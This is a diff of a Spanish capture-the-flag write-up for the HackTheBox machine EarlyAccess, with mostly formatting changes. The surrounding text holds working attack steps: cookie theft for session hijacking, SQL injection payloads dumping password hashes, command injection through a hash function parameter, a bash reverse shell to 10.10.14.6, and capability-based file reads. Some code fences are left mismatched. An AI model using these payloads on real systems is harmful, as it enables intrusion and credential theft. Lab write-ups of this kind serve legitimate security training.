@@ -81,8 +81,7 @@ height={475}
 />
 
 Intentamos un secuestro de sesión, ponemos un servidor  por el puerto 80 y esperamos que admin abra nuestro mensaje para que nos llegue sus cookies y lo remplazamos en nuestra sesión actual.
-
-<src
+<img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605556/hijack_session_coxtn0.webp'
 width={828}
 height={113}
@@ -108,7 +107,6 @@ Reemplazamos, refrescamos y wualaaaaaa.
 Vemos dos nuevas pestañas game y dev, nos llevan a dos subdominios <i>dev.earlyaccess.htb</i> y <i>game.earlyaccess.htb</i> lo añadimos a <i> /etc/hosts </i> e ingresamos.
 
 En la pestaña de Admin, vemos Download backup, lo descargamos y obtenemos validate.py
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605611/admin_bac_i8jkvo.webp'
 width={400}
@@ -216,7 +214,7 @@ Vemos que nuestra llave debe tener el formato <i>AAAAA-AAAAA-BBBB1-AAAAA-11111</
 ```python
 
 def valid_format(self) -> bool:
-return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))`.trim()}
+return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))`.trim()
 ```
 
 ### g1 - función
@@ -249,22 +247,16 @@ for v in string.ascii_uppercase + string.digits:
 value = (ord(v)<<i+1)%256^ord(v)
 print((f"{v}: {value}: {i}))
 `.trim()}
-/>
-<Highlighter
-text={`
+
 leo@nardo$ python3 script.py 0 | grep 221
-`.trim()}
-/>
-<CodeText
-maper={[
+`.trim()
 'K: 221: 0'
-]}
-/>
-<Paragraph>
+
+```
+
 Obtenemos nuestra cadena mágica para la función g1 <i>KEY25</i>, los últimos dos caracteres son números arbitrarios pero no únicos.
-</Paragraph>
-<Highlighter
-text={`
+
+```bash
 return len(set(g1)) == len(g1)
 `.trim()
 ```
@@ -466,7 +458,6 @@ do_post(keys)
 Importamos unas librerías, generamos nuestro <i>g3</i> y lo añadimos a una lista, nuestras posibles keys válidas
 luego hacemos una petición a <i>/login</i> con nuestra cuenta creada y arrastramos posteriormente nuestra sesión
 para hacer peticiones <i>post</i> por cada key y actualizando el token de <i>/key</i>.
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605663/key_page_lkvkdi.webp'
 width={506}
@@ -474,8 +465,8 @@ height={345}
 />
 
 ### Dev Access
-Refrescamos la página e ingresamos a <i>game.earlyaccess.htb</i>.
 
+Refrescamos la página e ingresamos a <i>game.earlyaccess.htb</i>.
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605692/game_version_m1kczl.webp'
 width={700}
@@ -484,7 +475,6 @@ height={662}
 
 Después de jugar al juego de la serpiente, nos vamos a la pestaña de scoreboard
 y vemos el tablero.
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605710/scoreboard_top_ten_pulkbo.webp'
 width={592}
@@ -493,7 +483,6 @@ height={296}
 
 Recordemos que en el foro hablaban que había un error en la parte del scoreboard
 relacionado con el nombre de usuario.
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605741/scoreboard_comment_nhpere.webp'
 width={592}
@@ -502,7 +491,6 @@ height={296}
 
 Nos vamos a la pestaña de Perfil y añadimos una <i>'</i> al final de nuestro nombre
 retornamos al scoreboard...
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605758/scoreboard_error_gxlxnq.webp'
 width={1266}
@@ -529,7 +517,6 @@ leonardo') union select 1, 2, column_name from information_schema.columns where 
 
 leonardo') union select 1, 2, group_concat(name, 0x3a, password) from users-- -
 ```
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605786/passwords_yjhkov.webp'
 width={1287}
@@ -553,7 +540,6 @@ height={1374}
 
 Vemos una herramienta de hasheo, cuál texto ingresado lo
 convierte en <i>MD5</i> o <i>SHA1</i>..
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605833/early_admin_HASH_du7c4b.webp'
 width={435}
@@ -597,7 +583,6 @@ Requests/sec.: 53.07106
 Tenemos un parámetro!, Al apuntar a <i>asd</i> nos retorna <i>invalid path</i> pero por ejemplo
 al cambiar a un archi que sabemos que existe por ejemplo <i>file.php</i> nos retorna un código de estado
 exitoso.
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605884/early_filepath_cseyt6.webp'
 width={687}
@@ -606,7 +591,6 @@ height={235}
 
 Aplicaremos <a target='_blank' src='https://www.php.net/manual/es/wrappers.php.php'>wrappers</a>, y convertiremos el texto en <i>base64</i> para luego
 leerlo.
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605930/early_wrapper_wvxs86.webp'
 width={902}
@@ -616,6 +600,7 @@ height={47}
 ```bash
 
 echo base64.txt | base64 -d > hash.php
+
 ```
 ### hash.php | source code
 Al final del archivo vemos una función <i>hash_pw</i> la cual llama la atención
@@ -665,14 +650,13 @@ acceso al sistema.
 ```bash
 action=hash&redirect=true&password=id&hash_function=system&debug=asd
 ```
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686605969/early_hash_pwn_qn3peo.webp'
 width={481}
 height={93}
 />
 
-Solo queda darnos una reverse shell.
+Queda darnos una reverse shell.
 
 ```bash
 action=hash&password=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"&hash_function=system&debug=1
@@ -709,7 +693,6 @@ www-data@webserver:/var/www/earlyaccess.htb/dev/actions$
 ```
 
 ### Usuario game-adm | Shell
-
 
 Nos dirigimos a <i>/home</i>, visualizamos un usuario <i>www-adm</i> y un archivo <i>.wgetrc</i>
 que puede ser interesante.
@@ -783,7 +766,6 @@ vemos un archivo <i>check_db</i>, lo descargamos...
 ```bash
 www-adm@webserver:/tmp$ wget http://172.18.0.101:5000/check_db
 ```
-
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686606024/early_json_pass_zzh7cq.webp'
 width={721}
@@ -881,14 +863,10 @@ con la extensión de foxy proxy por ejemplo configuramos...
 
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686606076/early_foxy_proxy_tg6bm1.webp'
-width={540}
-height={241}
 />
 
 <img
 src='https://res.cloudinary.com/djc1umong/image/upload/v1686606113/early_game_9999_m2kows.webp'
-width={528}
-height={222}
 />
 
 Ahora en <i>/</i> tenemos un archivo llamado <i>entrypoint.sh</i>
@@ -965,7 +943,7 @@ gamemaster (game-adm)
 
 genial nos dio una contraseña nos conectamos <i>drew@earlyaccess:/home$ su game-adm</i>
 este usuario pertenece al grupo <i>4(adm)</i> recordemos que teníamos <i>arp</i> con las
-capacidades de <i>=ep</i> la cual nos permite leer archivos como indica <a src='https://gtfobins.github.io/gtfobins/arp/#file-read' target='_blank'>gtfobins</a>,
+capacidades de <i>=ep</i> la cual nos permite leer archivos como indica <a href='https://gtfobins.github.io/gtfobins/arp/#file-read' target='_blank'>gtfobins</a>,
 entonces procedemos de la siguiente manera...
 
 ```bash
